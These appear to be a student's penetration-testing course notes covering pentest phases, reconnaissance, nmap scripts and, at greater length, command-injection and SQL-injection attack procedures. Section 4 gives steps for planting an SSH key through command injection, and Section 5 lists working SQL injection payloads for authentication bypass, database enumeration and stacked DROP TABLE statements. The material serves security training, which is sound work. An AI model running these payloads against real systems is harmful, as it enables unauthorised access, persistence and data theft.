Great pentesting website: Exploit Database


Section 1: Penetration Testing
- Penetration testing: 6 phases
        - Phase 1: Mission definition (define scope of mission, goals, targets, RoE)
        - Phase 2: Recon (OSINT)
        - Phase 3: Footprinting (scanning/interaction with target/target resources)
        - Phase 4: Exploitation & Initial Access (gaining initial foothold)
        - Phase 5: Post-Exploitation (persistence, priv escalation, covering tracks, exfiltrate target data)
        - Phase 6: Document Mission (document & report mission details)
- Pentest reporting:
        - OPNOTES vs Formalized Reporting
        - Executive Summary (for officers), Technical Summary (for cyber people)
        - Resons to report, what to report, screen captures



Section 2: Scanning & Recon
- Data to collect:
        - Web data: Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
        - Sensitive data: Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings
        - Publicly accessible data: Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
        - Social media: Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
        - Domain & IP data: DNS Registration, IP Address Assignments, Geolocation Data, Whois
- HTML: Hyper-Text Markup Language
        - Web browser: client-side interpretation
        - Utilizes elements identified by tags
        - Typically redirects to another page for server-side interaction
        - CSS (cascading sytlesheets) for page themeing
- Scraping Data: see python script
- Advanced Scanning Techniques:
        1. Host Discovery (find hosts that are online - ping)
        2. Port Enumeration (find ports for each host that is online - nmap)
        3. Port Interrogation (find what services are running on each open port - netcat)
- NMAP Scripting Engine: there are benefits to scanning with scripts.
        - located in /usr/share/nmap/scripts
        - NMAP script commands:
                nmap --script <filename>|<category>|<directory>
                nmap --script-help "ftp-* and discovery"
                nmap --script-args <args>
                nmap --script-args-file <filename>
                nmap --script-help <filename>|<category>|<directory>
                nmap --script-trace



Section 3: Vulnerability & Exploitation Research
- Most common method for gaining initial access: Phishing
- Components of exploitation research:
        - Transitioning from recon to weaponization
        - Leveraging intel/data about network
        - Pairing vulnerabilities to exploits
        - Aligning exploits to operational objectives
- Research methods: Open sources / organizational capabilities
        - Capabilities: COMSEC, etc.
- Testing: 
        - Exploit Development comes from vulnerability pairing & mission-driven requirements (test & verify success)
        - Benefits of testing: Faster time to breakout of initial foothold, reduced risk of detection/tool failure, improved recovery time.
- Exploit testing plan components:
        - Procure hardware & software
        - Set up testing environment
        - Assign a developer
        - Assign a tester to develop TTPs & break ot
        - Document results


Section 4:

Run ";whoami" to see if input is vulnerable to SQL command injection

Once at commmand injection location:
Use the sneaky method (;[command]) to cat /etc/passwd and find home directory of www-data
Upload copy of SSH RSA token to that home directory:
ls -la /var/www (home dir) to see whether a .ssh file is located in the home dir
mkdir /var/www/.ssh
ON CMD:
ls -la ../../.ssh/
ssh-keygen -t rsa -b 4096 (to generate keys in the first place)
cat ../../.ssh/id_rsa.pub (public - copy everything in this file)
cat ../../.ssh/id_rsa (private)
IN INJECTION SPOT:
;echo "[PASTE]" >> /var/www/.ssh/authorized_keys
ON CMD: ssh www-data@(target IP) (hijacks this user account on the target)


Section 5: SQL

THE GOLDEN STATEMENT: UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
        - This extracts those 3 crucial pieces of information from the "columns" table within the all-knowing schema (each of these 3 is a column within the "columns" table)
        - TABLE_SCHEMA: Names of all the databases across the entire server
        - TABLE_NAME: Names of all the tables across the entire server
        - COLUMN_NAME: Names of all the columns across the entire server
Golden Statement Process:
        > mysql (actually gets us into the sql server)
        > show databases ; (prints all databases; usually 3 databases by default are information_schema, mysql, performance_scheme)
        > use information_schema ; (reads database info)
        > show tables from information_schema ; (shows all the tables in the database)
                - Very important tables: COLUMNS
        > show columns from columns ; (because there is a column called "columns" within the table called "columns")
        > SELECT table_schema FROM information_schema.columns ; (shows the whole table_schema column from the "columns" table)
                - Important thing about SQL: Due to the relational nature of SQL, there will be many, many duplicates of schema names in this output: one for each table the schema includes.)
        > SELECT table_name FROM information_schema.columns ; 
                - Shows all the tables in the server, you need to have table_schema and table_name output together to see which tables belong to which database)
        > SELECT column_name FROM information_schema.columns ;
                - Shows all the columns in the server, this is the only field that has no duplicate entries since this is the most granular the results get)
        > UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
                - This will let you actually see the whole picture
Attack Steps: (POST)
        1. Identify vulnerable field
                - Throw the exploit for each valid entry (Audi ' OR 1='1)
                - If the query thrown has a \ that you didn't put in there, it automatically escapes single quotes and is not vulnerable)
        2. Identify number of columns
                - Throw a union select (Audi' UNION SELECT 1,2,3,4 #) up to the number of columns you see. "Show query" should show if there are any additional columns
                - Throw the same command but up to 5 columns (if show query showed 5 columns) to test that it worked
        3. Input golden statement, updated to reflect newly known number of columns.
                - If the form expects 5 columns, just add a ",4,5" after the 3 tables in the golden rule (this is junk placeholder - just makes the form happy)
                - Throw this: UNION SELECT table_schema,table_name,column_name,4,5 FROM information_schema.columns
                - Say that the form for some reason refuses to display column 2: instead run this:
                        - UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
                        - this will put a placeholder in the 2nd column (which is then not displayed) instead of something you actually want to see
Attack Steps (GET)
        1. Utilize dropdown, show query for each one
                - Note how many columns are shown and queried for
        2. Identify vulnerable field
                - In the URL, after "<selection>=", type "4 OR 1=1"
                - Instead of "4", try 1, or 2, or 3, etc; as many numbers as there are columns
        3. Union select
                - Run "selection=3 UNION SELECT 1,2,3,4"
                - Run the same thing up to 5 just to see if there's an extra hidden field (if not, there will be an error message)
                - Now we know how many fields the form expects - only 4, not extra hidden field
        4. Input golden statement
                - Throw this: UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
                - (may be out of order, but whatever. You can just rearrange the order you throw the tables in the statement if you're OCD)
Standard SQL Commands:
        - SELECT: Extracts data from a database (key)
                - Syntax: select movies including the string below
                        SELECT * FROM movies
                        WHERE Title LIKE "%Toy Story%"
        - UNION: Used to COMBINE the result of TWO OR MORE select statements (key)
                - UNION SELECT
        - USE: Selects the DB to use
        - UPDATE: Updates data in a database
        - DELETE: Deletes data from a database
        - INSERT INTO: Inserts new data into a database
        - CREATE DATABASE: Creates a new database
        - ALTER DATABASE: Modifies a database
        - CREATE TABLE: Creates a new table
        - ALTER TABLE: Modifies a table
        - DROP TABLE: Deletes a table
        - CREATE INDEX: Creates an index (search key)
        - DROP INDEX: Deletes an index

SQL Injection considerations:
        - Requires Valid SQL Queries
        - Fully patched systems CAN BE vulnerable due to misconfiguration
        - Input Field Sanitization
        - String vs Integer values
        - Is INFORMATION_SCHEMA database available? (contains all the tables, column names, etc. - very useful)
        - GET request vs POST request HTTP methods
Unsanitized vs Sanitized Fields:
        - Unsanitized: input fields can be found using a Single Quote ⇒ '
                - Will return extraneous information
                - ' closes a variable, to allow for additional statements/clauses
                - May show no errors or generic error (harder Injection)
        - Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
        - Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
Server-Side Query Processing
        - Say that user enters JohnDoe243 in the name form field and pass1234 in the pass form field...
        - The Server-Side Query that would be passed to MySQL from PHP would be:
                - Before input: SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
                - After input: SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
Statement Injection Example: (BYPASSING CREDENTIALS - POST)
        - Say that user enters: tom' OR 1='1 (in the name and pass fields)
                - Truth Statement: tom' OR 1='1
        - Server-Side query executed would appear like this:
                - SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
Statement Injection (GET):
        - Type in the POST statement injection into the fields but do not submit
        - Inspect page (F12), go to Network tab
        - Submit form, grab the info on the POST request, click on Request tab on the right, click on Raw option
                - add "?" to the end of the url, then copy-paste the result after that ?
        - This should get you the array of valid SQL queries
Stacking Statements:
        - You can add in whatever statements you want by utilizing a semi-colon ;
        - User input: Johnny'; DROP TABLE Customers; --
        - Server side: SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
Nesting Statements:
        - Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
        - Though they may allow for nesting a statement within an existing one:
        - Key User Input: UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
        - URL: php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
Messing with SQL
        - Using # or -- tells the Database to ignore everything after
        - User input: 1 or 1=1; #
        - Server Side: SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
                - Now you have unlimited tries!
Blind Injection:
        - Includes Statements to determine how DB is configured. Essential questions:
                - Columns in output?
                - Can we return errors?
                - Can we return expected output?
        - Used when unsanitized fields give generic error or no messages
        - Normal Query to pull expected output: php?item=4
        - Blind injection for validation: php?item=4 OR 1=1
        - Try ALL combinations! item=1, item=2, item=3, etc.
Abusing the Client! (GET)
        - Pass the injection through the URL: After the .php?item=4 pass your UNION statement
        - Key User Input: UNION SELECT 1,2,@@version
        - URL: prices.php?item=4 UNION SELECT 1,2,@@version
                - the @@version just queries for the SQL version
Abusing the Client! (enum)
        - Identifying the schema leads to detailed queries to enumerate the DB
                - Research Database Schemas and what information they provide 
        - Key User Input: UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
        - URL: php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
Defend!
        - Validate inputs!! Methods differ by software
        - CONCATENATE: turns inputs into single strings or escape characters (messes with the injection process a little)
                - PHP: mysql_real_escape_string
                - SQL: sqlite3_prepare()
